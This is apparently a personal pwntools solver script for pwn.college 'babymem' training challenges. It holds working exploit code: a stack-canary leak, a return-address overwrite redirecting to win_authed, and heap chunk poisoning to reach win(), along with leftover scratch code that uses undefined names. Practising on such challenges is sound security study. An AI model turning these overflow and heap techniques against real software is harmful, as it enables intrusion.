import pwn
import sys

class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/babymem_level{self.level}"
        self.local_process = f"binaries/babymem_level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"

#pwn.context.log_level = 'error'
#pwn.context.aslr = False
pwn.context.terminal = ['kitty']

def malloc(p, size, idx=None):
    idx_alloc = idx if idx is not None else 0
    pwn.log.info(f"{idx_alloc} = malloc({size})")
    data = p.recvuntil(b'): ')
    p.sendline(b'malloc')

    if idx is not None:
        data = p.recvuntil(b'Index: ')
        p.sendline(str(idx).encode())

    data = p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())

def free(p, idx=None):
    idx_alloc = idx if idx is not None else 0
    pwn.log.info(f"free({idx_alloc})")
    data = p.recvuntil(b'): ')
    p.sendline(b'free')

    if idx is not None:
        data = p.recvuntil(b'Index: ')
        p.sendline(str(idx).encode())

def scanf(p, bytes_data, idx=None, stack=False):
    idx_alloc = idx if idx is not None else 0
    pwn.log.info(f"scanf({bytes_data})")
    data = p.recvuntil(b'): ')
    cmd = b"scanf" if not stack else b"stack_scanf"
    p.sendline(cmd)

    if idx is not None:
        data = p.recvuntil(b'Index: ')
        p.sendline(str(idx).encode())

    data = p.recvline()
    print(bytes_data)
    p.sendline(bytes_data)

def puts(p, idx=None):
    idx_alloc = idx if idx is not None else 0
    pwn.log.info(f"puts({idx_alloc})")
    data = p.recvuntil(b'): ')
    p.sendline(b'puts')

    if idx is not None:
        data = p.recvuntil(b'Index: ')
        p.sendline(str(idx).encode())

    p.recvuntil(b'Data: ')
    return p.recvline()

def read_flag(p):
    pwn.log.info("read_flag")
    data = p.recvuntil(b'): ')
    p.sendline(b'read_flag')

def puts_flag(p):
    pwn.log.info("puts_flag")
    data = p.recvuntil(b'): ')
    p.sendline(b'puts_flag')
    p.recvline()
    flag = p.recvline().decode()
    pwn.log.success(flag)

def print_flag(p):
    data = p.recvuntil(b'Data: ')
    flag = p.recvuntil(b'}')
    pwn.log.success(flag.decode())
    data = p.clean()

def send_flag(p, password):
    pwn.log.info("send_flag")
    data = p.recvuntil(b'): ')
    p.sendline(b'send_flag')
    p.recvuntil(b'Secret: ')
    p.sendline(password)
    p.recvuntil(b'flag:\n')
    flag = p.recvuntil(b'}')
    pwn.log.success(flag.decode())
    data = p.clean()

def get_leak(p):
    data = p.recvuntil(b'is at: ')
    stack = p.recvline().decode().strip().replace('.', '')
    return pwn.p64(int(stack, 16))

def echo(p, idx, offset):
    pwn.log.info(f"echo({idx}, {offset})")
    data = p.recvuntil(b'): ')
    p.sendline(b'echo')

    data = p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())

    data = p.recvuntil(b'Offset: ')
    p.sendline(str(offset).encode())

    p.recvuntil(b'Data: ')
    return p.recvline().strip()

def stack_free(p):
    pwn.log.info("stack_free")
    data = p.recvuntil(b'): ')
    p.sendline(b'stack_free')

def stack_malloc_win(p):
    data = p.recvuntil(b'): ')
    p.sendline(b'stack_malloc_win')
    data = p.recvuntil(b'flag:\n')
    return p.recvline().decode()


def old():
    malloc_size = 32
    addr_scanf = 0x7fffffffe3c0
    addr_free = 0x7fffffffe400
    addr_canary = 0x7fffffffe448
    addr_ret = 0x7fffffffe498
    addr_stack_leak = 0x7fffffffe450

    main_base = elf.symbols['main']
    bin_echo_base = elf.symbols['bin_echo']

    malloc_length = addr_free - 8 - addr_scanf
    ret_offset = addr_ret - addr_stack_leak
    main_base = elf.symbols['main']
    win_base = elf.symbols['win']

    with pwn.process(filename) as p:
        #with pwn.gdb.debug(filename, 'b *main+325') as p:


        # Stack Scanf
        payload = b'A'*malloc_length + b'\x31' + b'\0'*7
        scanf(p, payload, stack=True)

        # Stack Free
        stack_free(p)

        # Store the malloc ptr
        malloc(p, malloc_size, 0)
        malloc(p, malloc_size, 1)
        free(p, 1)
        free(p, 0)

        # Echo (stack addr)
        bin_echo = echo(p, 0, 0)
        pwn.log.info(f"/bin/echo: {hex(int.from_bytes(bin_echo, 'little'))}")
        free(p, 0)

        # Base mapping
        bin_base = int.from_bytes(bin_echo, 'little') - bin_echo_base
        pwn.log.info(f"Base Addr: {hex(bin_base)}")
        elf.address = bin_base
        win = pwn.p64(elf.symbols['win'])
        pwn.log.info(f"win(): {hex(int.from_bytes(win, 'little'))}")

        # Stack leak
        stack_leak = echo(p, 0, 16)
        pwn.log.info(f"stack_leak: {hex(int.from_bytes(stack_leak, 'little'))}")
        ret_addr = int.from_bytes(stack_leak, 'little') + ret_offset
        pwn.log.info(f"ret_addr: {hex(ret_addr)}")
        free(p, 0)

        # Overwrite ret address
        scanf(p, pwn.p64(ret_addr), idx=0)
        malloc(p, 32, 0)
        malloc(p, 32, 1)
        scanf(p, win, idx=1)
        #scanf(p, b'A'*128, idx=1)
        p.interactive()
        exit()

def dbg(level):
    filename = level.local_process
    print(filename)
    elf = pwn.context.binary = pwn.ELF(filename)
    gdbscript = """
    init-split
    b *challenge
    b *challenge+490
    b *challenge+1836
    """
    with pwn.gdb.debug(filename, gdbscript=gdbscript, stdin=pwn.PTY, stdout=pwn.PTY) as p:
    #with pwn.process(filename) as p:
        buffer = 0x7ffc37d61a20
        leaked = 0x7ffc37d61aa8
        buffer = 0x7ffc544e2820
        leaked = 0x7ffc544e28c8
        canary = 0x7ffc544e29e8
        retadr = 0x7fff1c568f18


        init_payload = b"REPEAT"
        init_payload += b"A" * (leaked-buffer-len("REPEAT")+1)
        #payload_length = len(init_payload)
        payload_length = 200
        print(p.recvuntil(b"size: ").decode())
        p.sendline(str(payload_length).encode())

        print(p.recvuntil(b"bytes)!\n").decode())
        p.send(init_payload)
        #p.recvuntil(b"said: ")
        #resp = p.recvline().replace(b'\n', b'')
        #print(f"payload ({len(init_payload)}): {init_payload}\nresponse ({len(resp)}): {resp}")
        print(p.recvuntil(init_payload).decode())
        canary_value = b'\0' + p.recv(7)
        print(f"Canary: {canary_value.hex()}")

        payload = b"A" * (canary-buffer)
        payload += canary_value
        payload += b"B" * 8
        payload += pwn.pack(elf.symbols['win_authed']+28)[:2]
        payload_length = len(payload)
        print(p.recvuntil(b"size: ").decode())
        p.sendline(str(payload_length).encode())
        print(p.recvuntil(b"bytes)!\n").decode())
        p.send(payload)
        p.interactive()

        print("--- DETAILS ---")
        print(f"Payload Length: {payload_length}")
        print(pwn.pack(elf.symbols['win_authed']+28)[:2])
        print(payload.hex())
        print("---------------")

        print(p.recvuntil(b"bytes)!\n").decode())
        print(f"PAYLOAD LENGTH: {len(payload)}")
        p.send(payload)
        #p.send(b"A"*num_a + b"\xba\x19")
        #p.recvuntil(b"flag:\n")
        #print(p.recvline().decode())
        #print(p.recvall(timeout=1).decode())
        p.interactive()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} (level)")
        exit()

    level = Level(sys.argv[1])
    dbg(level)
